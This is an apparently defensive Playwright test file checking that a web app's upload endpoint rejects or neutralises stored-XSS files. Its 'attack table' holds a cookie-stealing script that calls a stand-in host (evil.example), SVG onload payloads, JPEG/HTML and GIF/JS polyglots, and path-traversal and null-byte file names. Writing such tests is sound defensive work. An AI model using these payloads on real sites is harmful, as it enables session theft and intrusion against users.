/**
 * Uploads are served from the app's own origin (FRONTEND_URL/uploads/...),
 * where a file the browser runs as a page or a script is stored XSS against
 * every signed-in user. Here the frontend serves them itself (the Next.js
 * route, STORAGE_PROVIDER=local), with the headers production nginx sends
 * (upload.serve.ts; nginx.hookpost.conf is checked in upload.serve.spec.ts
 * and scripts/check-nginx-uploads.sh).
 *
 * Two layers, both tested: the backend stores only real images and video,
 * by the bytes (upload.allowlist.ts), and a file that reached the directory
 * some other way still cannot run.
 */
import { expect, test } from '@playwright/test';
import { mkdirSync, readdirSync, statSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { BACKEND, control, signUpViaApi } from './support';

const UPLOAD_DIR = join(tmpdir(), 'hookpost-int-uploads');
const PNG = Buffer.from(
  '89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489' +
    '0000000d4944415478da636460f85f0f0002870180eb47ba920000000049454e44ae426082',
  'hex'
);
const JPEG_HEAD = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);

async function upload(auth: string, name: string, type: string, bytes: Buffer) {
  const form = new FormData();
  form.append('file', new Blob([new Uint8Array(bytes)], { type }), name);
  const res = await fetch(`${BACKEND}/media/upload-simple`, {
    method: 'POST',
    headers: { auth },
    body: form,
  });
  return { status: res.status, body: await res.json().catch(() => null) };
}

const filesIn = (dir: string): string[] => {
  try {
    return readdirSync(dir).flatMap((name) => {
      const full = join(dir, name);
      return statSync(full).isDirectory() ? filesIn(full) : [full];
    });
  } catch {
    return [];
  }
};

test.describe('uploads on the app origin', () => {
  test('an uploaded image shows in the page, with nosniff and a sandbox CSP', async ({ page }) => {
    const { auth, email } = await signUpViaApi(page.context());
    await control.givePlan(email, 'STANDARD');
    const up = await upload(auth, 'logo.png', 'image/png', PNG);
    expect(up.status).toBe(201);
    const url: string = up.body.path;
    expect(url).toMatch(/^http:\/\/localhost:\d+\/uploads\/\d{4}\/\d{2}\/\d{2}\/[0-9a-f]+\.png$/);

    const res = await page.request.get(url);
    expect(res.status()).toBe(200);
    expect(res.headers()['content-type']).toBe('image/png');
    expect(res.headers()['x-content-type-options']).toBe('nosniff');
    expect(res.headers()['content-security-policy']).toMatch(/default-src 'none'.*sandbox/);
    expect(res.headers()['content-disposition']).toBeUndefined();

    await page.goto('/launches');
    const width = await page.evaluate(
      (src) =>
        new Promise<number>((resolve) => {
          const img = new Image();
          img.onload = () => resolve(img.naturalWidth);
          img.onerror = () => resolve(-1);
          img.src = src;
        }),
      url
    );
    expect(width).toBe(1);
  });

  test('the attack table: what the upload endpoint refuses, and what it stores', async ({ page }) => {
    const { auth, email } = await signUpViaApi(page.context());
    await control.givePlan(email, 'STANDARD');
    const before = new Set(filesIn(UPLOAD_DIR));
    const html = Buffer.from('<!doctype html><script>fetch("//evil.example/?c="+document.cookie)</script>');
    const attacks: Array<[string, string, string, Buffer, number]> = [
      ['HTML page', 'x.html', 'text/html', html, 400],
      ['SVG with a script', 'x.svg', 'image/svg+xml', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>'), 400],
      ['HTML named .png, sent as image/png', 'x.png', 'image/png', html, 400],
      ['JPEG/HTML polyglot', 'x.jpg', 'image/jpeg', Buffer.concat([JPEG_HEAD, Buffer.from('<html><body><script>alert(1)</script>'), Buffer.alloc(64)]), 400],
      ['MP4 that opens as "<p >"', 'x.mp4', 'video/mp4', Buffer.concat([Buffer.from('<p >ftypisom', 'latin1'), Buffer.alloc(64)]), 400],
      ['double extension, HTML inside', 'x.html.png', 'image/png', html, 400],
      ['huge image (11 MB)', 'big.png', 'image/png', Buffer.concat([PNG, Buffer.alloc(11 * 1024 * 1024)]), 400],
    ];
    for (const [what, name, type, bytes, expected] of attacks) {
      const res = await upload(auth, name, type, bytes);
      expect([what, res.status]).toEqual([what, expected]);
    }
    // Nothing new on disk.
    expect(filesIn(UPLOAD_DIR).filter((f) => !before.has(f))).toEqual([]);

    // Accepted, but under a random name with the extension of what the bytes are.
    for (const name of ['evil.html', 'evil.php.png', '../../../../../tmp/pwned.png', 'x.png%00.html']) {
      const res = await upload(auth, name, 'text/html', PNG);
      expect([name, res.status]).toEqual([name, 201]);
      expect(res.body.path).toMatch(/\/uploads\/\d{4}\/\d{2}\/\d{2}\/[0-9a-f]+\.png$/);
    }
    const added = filesIn(UPLOAD_DIR).filter((f) => !before.has(f));
    expect(added).toHaveLength(4);
    for (const file of added) {
      expect(file.startsWith(UPLOAD_DIR + '/')).toBe(true);
      expect(file).toMatch(/\/[0-9a-f]+\.png$/);
    }
  });

  test('a file that reached the directory some other way cannot run on the origin', async ({ page }) => {
    await signUpViaApi(page.context());
    const day = join(UPLOAD_DIR, 'e2e-planted');
    mkdirSync(day, { recursive: true });
    const tag = Date.now().toString(36);
    writeFileSync(join(day, `${tag}.html`), '<script>window.top.__pwned = document.cookie; document.title = "PWNED"</script>');
    writeFileSync(join(day, `${tag}.svg`), '<svg xmlns="http://www.w3.org/2000/svg" onload="window.top.__pwned=1"><script>window.top.__pwned=1</script></svg>');
    // A GIF/JS polyglot: a valid GIF header that is also a line of JavaScript.
    writeFileSync(join(day, `${tag}.gif`), 'GIF89a/*\x00\x00*/=1;window.__pwned="polyglot";');

    for (const ext of ['html', 'svg']) {
      const res = await page.request.get(`/uploads/e2e-planted/${tag}.${ext}`);
      expect(res.status()).toBe(200);
      expect(res.headers()['content-type']).toBe('application/octet-stream');
      expect(res.headers()['content-disposition']).toBe('attachment');
      expect(res.headers()['x-content-type-options']).toBe('nosniff');
      expect(res.headers()['content-security-policy']).toContain('sandbox');
    }

    // Opened in the browser: a download, never a page.
    await page.goto('/launches');
    for (const ext of ['html', 'svg']) {
      const download = page.waitForEvent('download');
      await page.evaluate((href) => {
        const a = document.createElement('a');
        a.href = href;
        document.body.appendChild(a);
        a.click();
      }, `/uploads/e2e-planted/${tag}.${ext}`);
      await download;
    }
    // Framed, or loaded as a script from our own origin: nothing runs.
    const ran = await page.evaluate(async (base) => {
      const frame = document.createElement('iframe');
      frame.src = `${base}.svg`;
      document.body.appendChild(frame);
      const script = document.createElement('script');
      script.src = `${base}.gif`;
      const loaded = new Promise((resolve) => {
        script.onload = () => resolve('load');
        script.onerror = () => resolve('error');
      });
      document.head.appendChild(script);
      const outcome = await loaded;
      await new Promise((r) => setTimeout(r, 500));
      return { pwned: (window as any).__pwned ?? null, script: outcome };
    }, `/uploads/e2e-planted/${tag}`);
    expect(ran).toEqual({ pwned: null, script: 'error' });
    expect(await page.title()).not.toBe('PWNED');
  });
});
